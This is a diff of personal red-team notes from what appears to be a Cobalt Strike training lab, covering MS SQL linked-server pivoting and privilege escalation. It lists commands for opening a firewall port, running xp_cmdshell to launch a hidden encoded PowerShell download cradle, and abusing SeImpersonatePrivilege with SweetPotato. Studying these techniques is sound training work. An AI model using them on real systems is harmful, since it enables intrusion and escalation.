@@ -154,7 +154,7 @@ execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken
 
 **get beacon on new link**
 
-keep in mind that the new link my only be able to talk to the new sql server we already popped, so keep that in mind to set up the port forward for traffic
+keep in mind that the new link my only be able to talk to the new sql server we already popped, so keep that in mind to set up the port forward for traffic. CS will double hop it over so don't worry about setting up the forward to a different one just do so like below in the beacon that can talk to the link.
 
 ```
 powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
@@ -167,6 +167,20 @@ or with AT syntax:
 EXEC('xp_cmdshell ''powershell -w hidden -enc <base64 cradle>''') AT [sql-1.cyberbotic.io]
 
 ```
+
+## MS SQL Privilege Escalation
+
+Tools:
+[SweetPotato](https://github.com/CCob/SweetPotato)
+
+typical for sql servers to run as NT Service\MSSQLSERVER, we can upgrade these permissions by abusing SeImpersonatePrivilege
+```
+check privs
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
+execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <powershell download cradle>
+connect localhost 4444
+```
+
 
 
 
